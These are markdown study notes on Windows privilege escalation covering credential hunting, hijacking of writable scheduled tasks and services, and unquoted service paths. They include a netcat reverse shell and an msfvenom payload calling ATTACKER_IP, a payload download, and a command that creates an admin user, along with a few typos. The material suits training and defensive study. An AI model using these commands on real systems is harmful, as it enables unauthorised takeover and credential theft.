# Windows Privilege Escalation

## User Types

| Type | Description |
| ---- | ----------- |
| Administrators | Change any configuration |
| Standard | Limited tasks |
| SYSTEM / LocalSystem | Higher privilege than admin. Performs internal tasks. |
| Local Service | Runs services with minimum privilege. Uses anonymous connections. |
| Network Service | Minimum privileges. Uses computer credentials. |

## Unattended Windows Installations
The following locations could contain credentials if you know the OS was installed alongside several other hosts.

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## Powershell History
Powershell will store the history of commands 

```
# CMD.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# PS
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Saved Windows Credentials
You will not be able to see the actual passwords but you can try to run them with `runas`

`cmdkey /list` - List saved credentials
`runas /savecred /user:admin cmd.exe` - Attempt to use listed credentials

## IIS Configuration
Internet Information Services is the default web server in windows. The configuration file is called `web.config`

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# Quick DB string search
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connnectionString
```

# Retrieve Credentials from Sofware: PuTTY
Users won't allow users to store their SSH passwords, but it will store proxy configurations that include cleartext authentication credentials.

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

#Scheduled Tasks
We are interested in 2 of these parameters:

`Task to Run` - What gets executed by the scheduled task
`Run As User` - User to execute the task

If we can use the current user to modify or overwrite the "Task to Run" executable we can control what gets executed.

```
schtasks /query /tn nameoftasktoschedule /fo list /v

Folder:         \
HostName:       PC1
TaskName:       \vulntask
Task To Run:    C:\tasks\schtask.bat
Run As User:    taskusr1
```

To check file permissions on the executable:

```sh
icals c:\tasks-schtask.bat

c:\tasks\schtask.bat    NT AUTHORITY\SYSTEM:(I)(F)
                        BUILTIN\Administrators:(I)(F)
                        BUILTIN\Users:(I)(F)
```

From the output above we can see that `BUILT\Users` group has full access (F) over the tasks binary.

## Example Reverse Shell
Run from cmd.exe:

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

## Windows Services
Services are managed by Service Control Manager (SCM)

- each service will have an associated executable 
- implement special functions to communicate with SCM
- user account is specified by SCM
- `BINARY_PATH_NAME` - identifies associated executable
- `SERVICE_START_NAME` - account used to run service

```
sc qc apphostsvc

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
    TYPE                : 20 WIN32_SHARE_PROCESS
    START_TYPE          : 2  AUTO_START
    ERROR_CONTROL       : 1  NORMAL
    BINARY_PATH_NAME    : C:\Windows\system32\svchost.exe -k apphost
    LOAD_ORDER_GROUP    : 
    TAG                 : 0
    DISPLAY_NAME        : Application Host Helper Service
    DEPENDENCIES        :
    SERVICE_START_NAME  : localSystem
```

## Discretionary Access Control List (DACL)
Indicates who has permission to start, stop, pause, query, query configuration, or reconfigure the service.

All configurations are stored on the register under:

`HKLM\SYSTEM\CurrentControlSet\Services\`

| Name | Description |
| ---- | ----------- |
| ImagePath | Shows executable path |
| ObjectName | Account |
| Security | Indicates existence of DACL |

## Example Exploit
1. Query the service configuration:

`sc qc servicename`

2. Identify the account & path

`SERVICE_START_NAME: acountname`
`BINARY_PATH_NAME: C:\PROGR~2\SYSTEM~1\test.exe`

3. Check the permissions
The below line indications that the `EVERYONE` group has modify permissions and we can overwrite it. Refer to the [icacls cheatsheet](../Cheatsheets/icacls.md) for permission explainations.

```
icacls C:\PROGRA~2\SYSTEM~1\test.exe

EVERYONE: (I)(M)
```

4. Generate Payload
Using msfvenom create a payload and serve it from a python web server.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o payload.exe

# Start python server
python3 -m http.server
```

5. Pull the payload into Powershell
`wget http://ATTACKER_IP:8000/payload.exe -O payload.exe`

6. Replace the service executable
```sh
cd C:\PROGRA~2\SYSTEM~1\
cd C:\PROGRA~2\SYSTEM~1> move oldservice.exe oldservice.exe.bak
cd C:\PROGRA~2\SYSTEM~1> move payload.exe oldservice.exe
icacls payload.exe /grant Everyone:F
```

7. Reverse Listener
```sh
nc -lvp 4445
```

8. Restart Service
In a typical scenario you will likely not have the permission to restat the service.

```sh
sc stop servicename
sc start servicename
```

## UnQuoted Service Paths
Similar to an XSS vulnerability we can force a service to run by abusing improperly quoted paths.

```sh
"C:\Super Service\test.exe"

C:\Super Service\test.exe
```

Windows will try to do some guessing. As an attacker knowing this, we can create our own service called "Super.exe" located in the `C:\` that will execute in place of the intended test.exe.

# Windows Privileges
Check user privilteges:
```sh
whoami /priv
```
## Create a new user and add to group
```sh
net user USERNAME PASSWORD /add & net localgroup administrators USERNAME /add
```

## Helpful Resources:
- [Winnit.h](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [Priv2Admin](https://github.com/gtworek/Priv2Admin)

## SEBackup / SeRestore
Allow users to read and write to any file in the system without a DACL in place. Used for backups. These can be assigned to any user independent of their group memberships.

Export the current configuration:
```sh
secedit /export /cfg config.inf

## File contents snippet
[Privilege Rights]
SeBackupPrivilege *S-1-5-32-551,username
```

Convert the `.inf` file into a `.sdb` file and load the configuration back into the system.
```sh
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```
